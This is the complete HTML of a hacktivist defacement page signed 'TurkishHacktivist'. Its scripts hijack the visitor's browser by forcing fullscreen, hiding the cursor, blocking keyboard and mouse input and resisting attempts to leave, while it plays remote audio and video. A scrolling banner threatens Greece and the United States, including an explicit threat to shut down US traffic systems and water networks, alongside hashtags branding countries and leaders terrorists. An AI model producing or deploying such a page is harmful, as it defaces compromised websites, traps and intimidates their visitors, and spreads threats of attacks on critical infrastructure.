
<html>

  <head>
    <title>Hacked by TurkishHacktivist</title>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="theme-color" content="#000">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.0/jquery.min.js"></script>

  </head>
  <body bgcolor="black" text="white" oncontextmenu="return false;" onkeydown="return false;" onmousedown="return false;" onclick="document.getElementById('lagu').play();fs()" id="body" onload="typeWriter()">
    <style type="text/css">
      center {
        font-family: Courier;
      }

      img {
        opacity: 80%;
      }

      red {
        color: red;
      }

      #background-video {
        height: 100vh;
        width: 100vw;
        object-fit: cover;
        position: fixed;
        left: 0;
        right: 0;
        top: 0;
        bottom: 0;
        z-index: -1;
      }

      font {
        text-shadow: #000 0px 0px 3px;
        -webkit-font-smoothing: antialiased;
      }

      div {
        animation: glitch 1s linear infinite;
      }

      @keyframes glitch {

        2%,
        64% {
          transform: translate(2px, 0) skew(0deg);
        }

        4%,
        60% {
          transform: translate(-2px, 0) skew(0deg);
        }

        62% {
          transform: translate(0, 0) skew(5deg);
        }
      }

      div:before,
      div:after {
        content: attr(title);
        position: absolute;
        left: 0;
      }

      div:before {
        animation: glitchTop 1s linear infinite;
        clip-path: polygon(0 0, 100% 0, 100% 33%, 0 33%);
        -webkit-clip-path: polygon(0 0, 100% 0, 100% 33%, 0 33%);
      }

      @keyframes glitchTop {

        2%,
        64% {
          transform: translate(2px, -2px);
        }

        4%,
        60% {
          transform: translate(-2px, 2px);
        }

        62% {
          transform: translate(13px, -1px) skew(-13deg);
        }
      }

      div:after {
        animation: glitchBotom 1.5s linear infinite;
        clip-path: polygon(0 67%, 100% 67%, 100% 100%, 0 100%);
        -webkit-clip-path: polygon(0 67%, 100% 67%, 100% 100%, 0 100%);
      }

      @keyframes glitchBotom {

        2%,
        64% {
          transform: translate(-2px, 0);
        }

        4%,
        60% {
          transform: translate(-2px, 0);
        }

        62% {
          transform: translate(-22px, 5px) skew(21deg);
        }
      }
    </style>
    <script language="JavaScript">
      window.onbeforeunload = confirmExit;

      function confirmExit() {
        return "are you sure ? wkwk";
      }

      function fs() {
        var elem = document.documentElement;
        if (elem.requestFullscreen) {
          elem.requestFullscreen();
        } else if (elem.msRequestFullscreen) {
          elem.msRequestFullscreen();
        } else if (elem.mozRequestFullScreen) {
          elem.mozRequestFullScreen();
        } else if (elem.webkitRequestFullscreen) {
          elem.webkitRequestFullscreen();
        }
        document.getElementById("body").style.cursor = 'none';
        document.onkeydown = function(e) {
          return false;
        }
        document.addEventListener("keydown", e => {
          if (e.key == "F11") e.preventDefault();
        });
      }
    </script>
<script id="rendered-js">
document.addEventListener('DOMContentLoaded', function (event) {
  // array with texts to type in typewriter
  var dataText = ["She who does not know war does not know peace."];

  // type one text in the typwriter
  // keeps calling itself until the text is finished
  function typeWriter(text, i, fnCallback) {
    // chekc if text isn't finished yet
    if (i < text.length) {
      // add next character to h1

      document.getElementById("hekerabies").innerHTML = text.substring(0, i + 1);

      // wait for a while and call this function again for next character
      setTimeout(function () {
        typeWriter(text, i + 1, fnCallback);
      }, 150);
    }
    // text finished, call callback if there is a callback function
    else if (typeof fnCallback == 'function') {
        // call callback after timeout
        setTimeout(fnCallback, 7000);
      }
  }
  // start a typewriter animation for a text in the dataText array
  function StartTextAnimation(i) {
    if (typeof dataText[i] == 'undefined') {
      setTimeout(function () {
        StartTextAnimation(0);
      }, 30000);
    }
    // check if dataText[i] exists
    if (i < dataText[i].length) {
      // text exists! start typewriter animation
      typeWriter(dataText[i], 0, function () {
        // after callback (and whole text has been animated), start next text
        StartTextAnimation(i + 1);
      });
    }
  }
  // start the text animation
  StartTextAnimation(0);
});
//# sourceURL=pen.js

    </script>

  <center> <h4>Allah's Message</h4> <audio controls>
  <source src="https://raw.githubusercontent.com/hacktivisturkish/defaced/gh-pages/quran.wav" type="audio/mpeg">
</audio></center>
 <center> <h4>Message</h4> <audio controls>
  <source src="https://raw.githubusercontent.com/hacktivisturkish/defaced/gh-pages/mark.wav" type="audio/mpeg">
</audio></center>
    <video id="background-video" src="https://raw.githubusercontent.com/hacktivisturkish/defaced/gh-pages/bck.mp4" autoplay="" loop="" muted="" style="position: fixed;object-fit: cover;" poster="data:image/png;base64, iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=">
    </video>
    <table width="100%" height="80%">
      <td>
        <center>
          <small>TurkishHacktivist!</small>
          <br>
          <img src="https://d.ibtimes.co.uk/en/full/1488112/anonymous.jpg?w=1600&h=1600&q=88&f=09577e77fff35d80e8f49f701844a2a0" width="220" height="220" loading="lazy" onerror="this.style.display = 'none'">
          <br>Âllâhümme salli  <red><i>alâ Muhammed</i></red><br>
          <font size="1" color="gray">hacker by : rootayyildiz</font>
          <font size="2" id="hekerabies"></font><br><br>
          <small>
            <font size="1" color="blue">#Teroristİsrael #Teroristbiden #TeroristAmerica</font>
            <CENTER>                    <font size="1" color="red">Friends : Berserk - Qualwin - ChuckyWin - MarbeyliWerom - Asense - BamsiBey - Wise - Bozkurt - K4nun1 - Yeşil - MaxBey </font>
</CENTER>
          </small>
          </div>
          <div class="footer-greetings">
            <marquee>
              <font size="2">
                <b>Alert</b> Hello, I am a Turkish hacktivist, I wrote to you before. If you continue to support and provoke Greece, you will bury the Greek nation in history, pray in Athens, pray to allah and wait for what will happen to you gradually.

President, the global evil forces you serve, they need to know that an army whose commander is the Prophet Muhammad will not be defeated.

we are fighting for the cause of Allah, we are not fighting for loot or for popularity, we are not using innocent people like you, we are helping and giving them treats.
hey america, we have not harmed your priv systems until now
but remember this, we will stop all your traffic systems from new york to pennsylvia, we will cancel your water networks, this is a clear threat message



              </font>

            </marquee>
            <center>              <img src="https://imgyukle.com/f/2022/06/16/VT7Y2U.jpg" width="620" height="420" loading="lazy" onerror="this.style.display = 'none'">
</center>
          </div>
      </td>
    </table>
